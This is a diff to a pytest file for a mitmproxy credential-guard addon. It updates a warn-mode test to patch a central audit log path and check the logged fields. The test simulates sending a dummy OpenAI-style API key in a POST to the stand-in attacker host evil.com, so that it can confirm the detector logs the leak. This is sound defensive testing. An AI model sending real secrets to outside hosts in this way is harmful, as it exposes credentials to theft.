@@ -274,36 +274,41 @@ class TestBlockingMode:
         """Test that warn mode still logs violations."""
         from addons.credential_guard import CredentialGuard, DEFAULT_RULES
         from mitmproxy.test import taddons
+        from unittest.mock import patch
+        import json
+
+        log_path = tmp_path / "audit.jsonl"
 
         guard = CredentialGuard()
         guard.rules = list(DEFAULT_RULES)
         guard.hmac_secret = b"test-secret"
         guard.config = {}
         guard.safe_headers_config = {}
-        guard.log_path = tmp_path / "violations.jsonl"
 
-        # Set up context with warn mode and body scanning
-        with taddons.context(guard) as tctx:
-            tctx.options.credguard_block = False  # Warn-only mode
-            tctx.options.credguard_scan_bodies = True
+        # Patch the central AUDIT_LOG_PATH to use our temp path
+        with patch("addons.utils.AUDIT_LOG_PATH", log_path):
+            # Set up context with warn mode and body scanning
+            with taddons.context(guard) as tctx:
+                tctx.options.credguard_block = False  # Warn-only mode
+                tctx.options.credguard_scan_bodies = True
 
-            flow = make_flow(
-                method="POST",
-                url="https://evil.com/api",
-                content='{"key": "sk-abc123xyz456def789ghijklmno"}',
-                headers={"Content-Type": "application/json"},
-            )
+                flow = make_flow(
+                    method="POST",
+                    url="https://evil.com/api",
+                    content='{"key": "sk-abc123xyz456def789ghijklmno"}',
+                    headers={"Content-Type": "application/json"},
+                )
 
-            guard.request(flow)
+                guard.request(flow)
 
-            # Should have logged the violation
-            assert guard.log_path.exists()
-            import json
-            with open(guard.log_path) as f:
-                log_entry = json.loads(f.readline())
-            assert log_entry["event"] == "credential_violation"
-            assert log_entry["rule"] == "openai"
-            assert log_entry["host"] == "evil.com"
+                # Should have logged the violation
+                assert log_path.exists()
+                with open(log_path) as f:
+                    log_entry = json.loads(f.readline())
+                assert log_entry["event"] == "security.credential"
+                assert log_entry["rule"] == "openai"
+                assert log_entry["host"] == "evil.com"
+                assert log_entry["decision"] == "warn"
 
     def test_default_is_block_mode(self):
         """Test that default behavior is block mode."""
